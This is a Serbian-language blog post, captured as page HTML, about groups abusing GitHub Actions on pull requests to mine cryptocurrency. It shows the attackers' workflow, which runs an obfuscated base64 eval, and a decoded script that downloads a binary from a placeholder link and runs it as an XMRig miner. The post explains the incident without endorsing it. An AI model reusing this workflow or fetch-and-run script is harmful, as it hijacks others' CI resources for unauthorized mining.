<!doctype html> <html lang=sr> <head> <meta charset=utf-8> <meta content=#333333 name=theme-color> <meta content="width=device-width,initial-scale=1" name=viewport> <title>Трајекторија</title> <meta content="трајекторија, блог, на српском, јаваскрипт, програмирање, србија" name=keywords> <meta content=Трајекторија name=title> <meta content=Трајекторија property=og:title> <meta content=Трајекторија property=twitter:title> <meta content="Трајекторија се бави темама из света програмирања. Циљ је скроман допринос српској заједници програмера." name=description> <meta content="Трајекторија се бави темама из света програмирања. Циљ је скроман допринос српској заједници програмера." property=og:description> <meta content="Трајекторија се бави темама из света програмирања. Циљ је скроман допринос српској заједници програмера." property=twitter:description> <meta content=https://trajektorija.com/logo_large.png property=og:image> <meta content=https://trajektorija.com/logo_large.png property=twitter:image> <meta content="Логотип сајта Трајекторија" property=og:image:alt> <meta content="Логотип сајта Трајекторија" property=twitter:image:alt> <meta content=https://trajektorija.com property=og:url> <meta content=website property=og:type> <meta content=summary_large_image property=twitter:card> <link href=https://fonts.gstatic.com rel=preconnect> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:wght@400;500&family=Roboto+Condensed:wght@400;500&display=swap" rel=stylesheet> <base href=/ > <link href=global.css rel=stylesheet> <link href=manifest.json rel=manifest crossorigin=use-credentials> <link href=favicon.png rel=icon type=image/png> <script>__SAPPER__={baseUrl:"",preloaded:[void 0,(function(a,b){return {post:{title:a,description:b,html:"\n \u003Cp\u003E\n  У мору наслова и чланака којима ме Гугл бомбардује сваки пут када отворим Хром, нашао се један који ми је привукао пажњу и који сам чак сачувао да сутра ујутру прочитам поново. \n  Ту ноћ сам се осећао као прави детектив са све моноклом док сам гледао приложене доказе догађаја. Одмах бих на почетку и похвалио аутора и приметио да је прилично имао искуства \n  са таквим догађајима и да је знао да ће у веома кратком року све то нестати и постати једна од многих недоступних 404 страница. На сву срећу то је све сачувано у формату текст - линк - снимак екрана.\n \u003C\u002Fp\u003E\n\n \u003Cp\u003E\n  Дакле, ради се о томе да је неколико група људи користило Гитхаб акције на репозиторијумима за покретање програма, у овом случају за крипто рударење. \n  Требало је да се одраде само два корака, а то су: да се напише скрита која ће да се активира на захтев за спајање и потом да се направи тај захтев направи.\n\u003C\u002Fp\u003E\n \u003Cp\u003E\n   Скипта је изгледала отприлике овако:\n \u003C\u002Fp\u003E\n \u003Ccode\u003E\n \u003Cpre\u003E\nname: Test\non: [pull_request]\njobs:\n    test:\n      name: Fetch\n      runs-on: ubuntu-latest\n      container: ubuntu:20.10\n      strategy:\n        fail-fast: false\n        matrix:\n          runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]\n        steps:\n          - run: |\n                eval \"$(echo \"BASE_64_ENCODED_STRING\" | base64 -d)\"\n\u003C\u002Fpre\u003E\n \u003C\u002Fcode\u003E\n \u003Cp\u003E\n  Оно што одмах може да се види да се користи максималан број апликација које покрећу послове. У овом случају може бити највише 20 конкурентних послова из тог разлога што Гитхаб бесплатни налог не дозвољава више.\n  Што се тиче шифровања, овај начин је опште познат. У Јаваскрипту се једноставно може добити коришћењем функције \u003Ci\u003Ebtoa\u003C\u002Fi\u003E, а може се дешифровати функцијом \u003Ci\u003Eatob\u003C\u002Fi\u003E.\n \u003C\u002Fp\u003E\n \u003Cp\u003E\n У овом случају, оно што је било шифровано је изгледало слично овоме:\n \u003C\u002Fp\u003E\n\n \u003Ccode\u003E\n \u003Cpre\u003E\napt update -qq\napt install -y curl jq\ncurl -Lfo prog LINK_TO_FILE_DOWNLOAD_LOCATION\nip=$(curl -s -H 'accept: application\u002Fdns-json' 'https:\u002F\u002Fdns.google\u002Fresolve?name=DOMAIN_NAME' | jq -r '.Answer[0].data')\nchmod u+x prog\ntimeout 4h .\u002Fprog -o \"${ip}:3000\" -u username -p password --cpu-priority 5 \u003E \u002Fdev\u002Fnull\n\u003C\u002Fpre\u003E\n\u003C\u002Fcode\u003E\n\n \u003Cp\u003E\n  Прилично је познато шта се догађа у овој скрипти која ће да се изврши:\n \u003C\u002Fp\u003E\n\n \u003Cul\u003E\n  \u003Cli\u003EИнсталираће се све што је потребно овој скрипти да функционише\u003C\u002Fli\u003E\n  \u003Cli\u003EСкинуће програм на машину\u003C\u002Fli\u003E\n  \u003Cli\u003EДохватиће IP адресу домена који му треба да би проследио као параметар програму\u003C\u002Fli\u003E\n  \u003Cli\u003EПромениће права скинутом програму у складу са корисником који ће то да изрши\u003C\u002Fli\u003E\n  \u003Cli\u003EИзвршиће програм са прослеђеним параметрима\u003C\u002Fli\u003E\n \u003C\u002Ful\u003E\n\n \u003Cp\u003E\n  Даљим истраживањем скинутог фајла могло је да се види да је \u003Ci\u003Eprog\u003C\u002Fi\u003E у ствари програм за крипто рударење \u003Ca href=\"https:\u002F\u002Fgithub.com\u002Fxmrig\u002Fxmrig\" target=\"new\"\u003EXMRig\u003C\u002Fa\u003E.\n \u003C\u002Fp\u003E\n\n \u003Ccode\u003E\n  \u003Cpre\u003E\n.\u002Fprog --version\n\nXMRig 6.8.1\n built on Feb 03 2021 with GCC 10.2.1\n features: 64-bit AES\n\u003C\u002Fpre\u003E\n \u003C\u002Fcode\u003E\n\n \u003Cp\u003E\n Одатле су потекли разни наслови да се врше напади и да то раде организоване групе хакера. Сами власници репозиторијума нису били претерано оштећени осим што им је пристигло много мејлова од Гитхаба како је \n захтев за спајање отворен, па затворен и тако у круг.\n \u003C\u002Fp\u003E\n \n \u003Cp\u003E\n  Као прво, не бих се сложио са тим да су се на Гитхабу одвијали напади или да је неко нападао њихове сервере. То бих пре назвао злоупотребом. \n  Као друго не бих ни називао те људе хакерима и пре бих рекао да су искористили оно на чему сам Гитхаб потенцира, а то је да извршавају корисников код који је потпуно произвољан. \n  Гитхаб је дао могућност апсолутно свима да извршавају своје скрипте на својим виртуелним машинама само је потребно да направе бесплатан налог и напишу како ће акција да ради и када ће да се активира.\n \u003C\u002Fp\u003E\n\n \u003Cp\u003E\n  Након успостављања контакта са службом подршке, све се на крају завршавало добро по власнике репозиторијума. \n  Лажни налози корисника који су терали акције да се активирају су били обрисани, а власници репозиторијума где се све то одвијало су за време док се проблем не реши једино могли да привремено онемогуће акције. \n \u003C\u002Fp\u003E\n\n \u003Cp\u003E\n  И није баш да су наши испамовани власници репозиторијума остали празних руку. Као успомена им је остао читав репозиторијум са јединственом историјом, а мислим да више и није потребно.\n \u003C\u002Fp\u003E\n",slug:"github-akcije-i-rudarenje-kriptovaluta",categories:[{id:"github",label:"Гитхаб"},{id:"kriptovalute",label:"Криптовалуте"},{id:"bezbednost",label:"Безбедност"}],date:1618263265064,metadata:{title:a,description:b,keywords:"Гитхаб, Криптовалуте, Безбедност",url:"https:\u002F\u002Ftrajektorija.com\u002Fgithub-akcije-i-rudarenje-kriptovaluta",thumb:"https:\u002F\u002Ftrajektorija.com\u002Fimages\u002Fposts\u002Fgithub-akcije-i-rudarenje-kriptovaluta.png",thumbAlt:"Логотип сајта Трајекторија"}}}}("Гитхаб акције и рударење криптовалута","О скорашњим догађајима и злоупотреби Гитхаб акција"))]};if('serviceWorker' in navigator)navigator.serviceWorker.register('/service-worker.js');(function(){try{eval("async function x(){}");var main="/client/client.06d3b2a9.js"}catch(e){main="/client/legacy/client.02ff8668.js"};var s=document.createElement("script");try{new Function("if(0)import('')")();s.src=main;s.type="module";s.crossOrigin="use-credentials";}catch(e){s.src="/client/shimport@2.0.4.js";s.setAttribute("data-main",main);}document.head.appendChild(s);}());</script> <link href=client/client-9de7cf7e.css rel=stylesheet><link href=client/[slug]-007c2a65.css rel=stylesheet> <title>Гитхаб акције и рударење криптовалута | Трајекторија</title><meta content="Гитхаб, Криптовалуте, Безбедност" data-svelte=svelte-jnjsyk name=keywords><meta content="Гитхаб акције и рударење криптовалута" data-svelte=svelte-jnjsyk name=title><meta content="Гитхаб акције и рударење криптовалута" property=og:title data-svelte=svelte-jnjsyk><meta content="Гитхаб акције и рударење криптовалута" property=twitter:title data-svelte=svelte-jnjsyk><meta content="О скорашњим догађајима и злоупотреби Гитхаб акција" data-svelte=svelte-jnjsyk name=description><meta content="О скорашњим догађајима и злоупотреби Гитхаб акција" property=og:description data-svelte=svelte-jnjsyk><meta content="О скорашњим догађајима и злоупотреби Гитхаб акција" property=twitter:description data-svelte=svelte-jnjsyk><meta content=https://trajektorija.com/images/posts/github-akcije-i-rudarenje-kriptovaluta.png property=og:image data-svelte=svelte-jnjsyk><meta content=https://trajektorija.com/images/posts/github-akcije-i-rudarenje-kriptovaluta.png property=twitter:image data-svelte=svelte-jnjsyk><meta content="Логотип сајта Трајекторија" property=og:image:alt data-svelte=svelte-jnjsyk><meta content="Логотип сајта Трајекторија" property=twitter:image:alt data-svelte=svelte-jnjsyk><meta content=https://trajektorija.com/github-akcije-i-rudarenje-kriptovaluta property=og:url data-svelte=svelte-jnjsyk><meta content=article property=og:type data-svelte=svelte-jnjsyk><meta content=summary_large_image property=twitter:card data-svelte=svelte-jnjsyk> <link href=/client/client.06d3b2a9.js rel=modulepreload as=script crossorigin=use-credentials><link href=/client/client-9de7cf7e.css rel=preload as=style><link href=/client/[slug].5233a331.js rel=modulepreload as=script crossorigin=use-credentials><link href=/client/index.2119317d.js rel=modulepreload as=script crossorigin=use-credentials><link href=/client/inject_styles.5607aec6.js rel=modulepreload as=script crossorigin=use-credentials><link href=/client/[slug]-007c2a65.css rel=preload as=style></head> <body> <div id=sapper> <div class="svelte-1qbgn1e nav"><a href=/ class=svelte-1qbgn1e><div class="svelte-1qbgn1e center-logo"><h1 class=svelte-1qbgn1e>Трајекторија</h1></div></a></div> <main class=svelte-1eviz8r> <div><h1 class=svelte-jbhz4b>Гитхаб акције и рударење криптовалута</h1> <div class="svelte-jbhz4b content"> <p> У мору наслова и чланака којима ме Гугл бомбардује сваки пут када отворим Хром, нашао се један који ми је привукао пажњу и који сам чак сачувао да сутра ујутру прочитам поново. Ту ноћ сам се осећао као прави детектив са све моноклом док сам гледао приложене доказе догађаја. Одмах бих на почетку и похвалио аутора и приметио да је прилично имао искуства са таквим догађајима и да је знао да ће у веома кратком року све то нестати и постати једна од многих недоступних 404 страница. На сву срећу то је све сачувано у формату текст - линк - снимак екрана. </p> <p> Дакле, ради се о томе да је неколико група људи користило Гитхаб акције на репозиторијумима за покретање програма, у овом случају за крипто рударење. Требало је да се одраде само два корака, а то су: да се напише скрита која ће да се активира на захтев за спајање и потом да се направи тај захтев направи. </p> <p> Скипта је изгледала отприлике овако: </p> <code> <pre>
name: Test
on: [pull_request]
jobs:
    test:
      name: Fetch
      runs-on: ubuntu-latest
      container: ubuntu:20.10
      strategy:
        fail-fast: false
        matrix:
          runner: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
        steps:
          - run: |
                eval "$(echo "BASE_64_ENCODED_STRING" | base64 -d)"
</pre> </code> <p> Оно што одмах може да се види да се користи максималан број апликација које покрећу послове. У овом случају може бити највише 20 конкурентних послова из тог разлога што Гитхаб бесплатни налог не дозвољава више. Што се тиче шифровања, овај начин је опште познат. У Јаваскрипту се једноставно може добити коришћењем функције <i>btoa</i>, а може се дешифровати функцијом <i>atob</i>. </p> <p> У овом случају, оно што је било шифровано је изгледало слично овоме: </p> <code> <pre>
apt update -qq
apt install -y curl jq
curl -Lfo prog LINK_TO_FILE_DOWNLOAD_LOCATION
ip=$(curl -s -H 'accept: application/dns-json' 'https://dns.google/resolve?name=DOMAIN_NAME' | jq -r '.Answer[0].data')
chmod u+x prog
timeout 4h ./prog -o "${ip}:3000" -u username -p password --cpu-priority 5 > /dev/null
</pre> </code> <p> Прилично је познато шта се догађа у овој скрипти која ће да се изврши: </p> <ul> <li>Инсталираће се све што је потребно овој скрипти да функционише</li> <li>Скинуће програм на машину</li> <li>Дохватиће IP адресу домена који му треба да би проследио као параметар програму</li> <li>Промениће права скинутом програму у складу са корисником који ће то да изрши</li> <li>Извршиће програм са прослеђеним параметрима</li> </ul> <p> Даљим истраживањем скинутог фајла могло је да се види да је <i>prog</i> у ствари програм за крипто рударење <a href=https://github.com/xmrig/xmrig target=new>XMRig</a>. </p> <code> <pre>
./prog --version

XMRig 6.8.1
 built on Feb 03 2021 with GCC 10.2.1
 features: 64-bit AES
</pre> </code> <p> Одатле су потекли разни наслови да се врше напади и да то раде организоване групе хакера. Сами власници репозиторијума нису били претерано оштећени осим што им је пристигло много мејлова од Гитхаба како је захтев за спајање отворен, па затворен и тако у круг. </p> <p> Као прво, не бих се сложио са тим да су се на Гитхабу одвијали напади или да је неко нападао њихове сервере. То бих пре назвао злоупотребом. Као друго не бих ни називао те људе хакерима и пре бих рекао да су искористили оно на чему сам Гитхаб потенцира, а то је да извршавају корисников код који је потпуно произвољан. Гитхаб је дао могућност апсолутно свима да извршавају своје скрипте на својим виртуелним машинама само је потребно да направе бесплатан налог и напишу како ће акција да ради и када ће да се активира. </p> <p> Након успостављања контакта са службом подршке, све се на крају завршавало добро по власнике репозиторијума. Лажни налози корисника који су терали акције да се активирају су били обрисани, а власници репозиторијума где се све то одвијало су за време док се проблем не реши једино могли да привремено онемогуће акције. </p> <p> И није баш да су наши испамовани власници репозиторијума остали празних руку. Као успомена им је остао читав репозиторијум са јединственом историјом, а мислим да више и није потребно. </p> </div></div></main> <footer class=svelte-1eviz8r><div class="svelte-1eviz8r footer-content"><a href=/ class="svelte-1eviz8r copyright-link">Трајекторија<span class="svelte-1eviz8r copy">©</span><span class="svelte-1eviz8r date">2021</span></a> <div class="svelte-1eviz8r controls"><button class=svelte-1eviz8r> <svg fill=currentColor height=14 stroke=currentColor stroke-width=0 viewBox="0 0 20 20" width=14 xmlns=http://www.w3.org/2000/svg><path d="M15 8a3 3 0 10-2.977-2.63l-4.94 2.47a3 3 0 100 4.319l4.94 2.47a3 3 0 10.895-1.789l-4.94-2.47a3.027 3.027 0 000-.74l4.94-2.47C13.456 7.68 14.19 8 15 8z"></path></svg></button> <button class=svelte-1eviz8r><svg fill=currentColor height=14 stroke=currentColor stroke-width=0 viewBox="0 0 576 512" width=14 xmlns=http://www.w3.org/2000/svg><path d="M342.8 352.7c5.7-9.6 9.2-20.7 9.2-32.7 0-35.3-28.7-64-64-64-17.2 0-32.8 6.9-44.3 17.9-16.3-29.6-47.5-49.9-83.7-49.9-53 0-96 43-96 96 0 2 .5 3.8.6 5.7C27.1 338.8 0 374.1 0 416c0 53 43 96 96 96h240c44.2 0 80-35.8 80-80 0-41.9-32.3-75.8-73.2-79.3zm222.5-54.3c-93.1 17.7-178.5-53.7-178.5-147.7 0-54.2 29-104 76.1-130.8 7.3-4.1 5.4-15.1-2.8-16.7C448.4 1.1 436.7 0 425 0 319.1 0 233.1 85.9 233.1 192c0 8.5.7 16.8 1.8 25 5.9 4.3 11.6 8.9 16.7 14.2 11.4-4.7 23.7-7.2 36.4-7.2 52.9 0 96 43.1 96 96 0 3.6-.2 7.2-.6 10.7 23.6 10.8 42.4 29.5 53.5 52.6 54.4-3.4 103.7-29.3 137.1-70.4 5.3-6.5-.5-16.1-8.7-14.5z"></path></svg></button></div></div></footer></div> 